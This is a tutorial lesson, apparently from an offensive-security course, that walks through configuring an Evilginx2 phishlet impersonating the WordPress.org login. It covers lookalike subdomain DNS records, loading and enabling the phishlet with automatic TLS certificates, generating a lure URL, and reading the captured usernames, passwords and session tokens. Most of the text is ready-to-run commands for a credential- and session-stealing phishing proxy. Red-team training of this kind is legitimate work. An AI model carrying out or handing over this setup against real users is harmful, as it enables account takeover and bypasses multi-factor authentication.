### Part 1: Update DNS Records for Phishlet Subdomains

The WordPress.org phishlet requires several subdomains to operate correctly:

- `login.yourdomain.com`
- `make.yourdomain.com`
- `profiles.yourdomain.com`

#### [](https://www.hacksmarter.org/courses/3f9917b1-13b0-48f4-b43f-387e245656e7/take/65-configuring-your-first-phishlet#user-content-steps-using-namecheap)Steps (Using Namecheap):

1. Log into your Namecheap account.
2. Go to **Domain List** → click **Manage** on your domain.
3. Navigate to the **Advanced DNS** tab.
4. Add three new **A Records**:

- - **Type**: A Record
    - **Host**: `login`, `make`, and `profiles` (one per record)
    - **Value**: Your VPS public IP (e.g., `147.182.215.174`)
    - **TTL**: 1 minute

1. Click the green **✓** to save each one.
2. Wait ~5 minutes for DNS propagation.

### [](https://www.hacksmarter.org/courses/3f9917b1-13b0-48f4-b43f-387e245656e7/take/65-configuring-your-first-phishlet#user-content-part-2-add-the-phishlet-to-evilginx)Part 2: Add the Phishlet to Evilginx

- SSH into your Digital Ocean Droplet:

```
ssh root@[your_ip]
```

- Navigate to the `phishlets/` directory:

```
cd ~/evilginx/phishlets
```

- Open a new YAML file and paste the WordPress phishlet content:

```
nano wordpress.org.yaml
```

- Paste the phishlet (copied from GitHub or local source).
- Save and exit (`Ctrl + X`, then `Y`, then `Enter`).

---

### [](https://www.hacksmarter.org/courses/3f9917b1-13b0-48f4-b43f-387e245656e7/take/65-configuring-your-first-phishlet#user-content-part-3-enable-the-phishlet-in-evilginx)Part 3: Enable the Phishlet in Evilginx

- Restart Evilginx2 to load the new phishlet:

```
./evilginx
```

- Inside the Evilginx2 shell:

```
phishlets # Confirm it appears in the list phishlets hide example # Hide the default example
```

- Set the hostname (use your domain):

```
phishlets hostname wordpress.org yourdomain.com
```

- Enable the phishlet:

```
phishlets enable wordpress.org
```

> TLS certificates will be automatically requested for all required subdomains. This may take up to 60 seconds.

### [](https://www.hacksmarter.org/courses/3f9917b1-13b0-48f4-b43f-387e245656e7/take/65-configuring-your-first-phishlet#user-content-part-4-create-and-test-the-lure)Part 4: Create and Test the Lure

- Create a lure:

```
lures create wordpress.org
```

- Get the lure URL:

```
lures get-url 0
```

1. Open the URL in Firefox. You should see the WordPress.org login page, served from your malicious subdomain (e.g., `login.yourdomain.com`).

### [](https://www.hacksmarter.org/courses/3f9917b1-13b0-48f4-b43f-387e245656e7/take/65-configuring-your-first-phishlet#user-content-part-5-simulate-a-victim-login)Part 5: Simulate a Victim Login

Use dummy credentials:

- Username: `admin`
- Password: `password123`

Submit the login form.

- In Evilginx, check for captured data:

```
sessions
```

You should now see:

- Victim’s username
- Password
- Session tokens (if login succeeded)
- Source IP and timestamp

> ⚠️ If bots are hitting your Evilginx2 Instance, you may see many failed requests — Evilginx automatically blacklists non-lure traffic. It will slow down after 5 - 10 minutes.
